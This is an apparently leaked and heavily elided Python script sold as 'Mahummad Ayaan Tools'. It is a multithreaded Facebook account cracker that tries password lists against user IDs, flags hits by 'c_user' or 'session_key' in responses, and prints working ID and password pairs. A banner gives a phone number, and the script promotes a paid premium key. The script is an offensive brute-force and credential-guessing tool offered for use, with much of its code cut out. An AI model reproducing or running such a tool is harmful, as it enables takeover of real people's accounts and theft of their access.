#SOURCE LEAKED BY :MR-HÃÎDÈR

#REASON : BECAUSE LOL BADSHAH

#WAS INTERFERE BETWEEN

#HÃÎDÈR & LKING FIGHT ðŸ˜Ž 
...
logo=("""\033[1;37m
 ...
 Facebook  : Mahummad Ayaan Tricks

 Tool Name : Mahummad Ayaan Tools

 Type type : Free

 Version   : 0.6

 WhatsApp  : 03213915156

____⚔️____💙❥❥━─🩸TRT📌━─➸➽♥️___⚔️___♥️⇣❥

🥀Thanks S Y C O ツ And Usman Gul For Support ❤

\033[1;37m____⚔️____💙❥❥━─🩸TRT📌━─➸➽♥️___⚔️___♥️⇣❥""")
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for very speed up\033[1;37m")
                                ...
                                os.system('xdg-open https://www.facebook.com/groups/1349513685860303/permalink/1365964870881851/');menu()
                        ...
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid Mahummad Ayaan Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python FARYAL.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [AYAAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [AYAAN-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [AYAAN-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AYAAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [AYAAN-OK] '+uid+' | '+pas+'\033[1;97m')
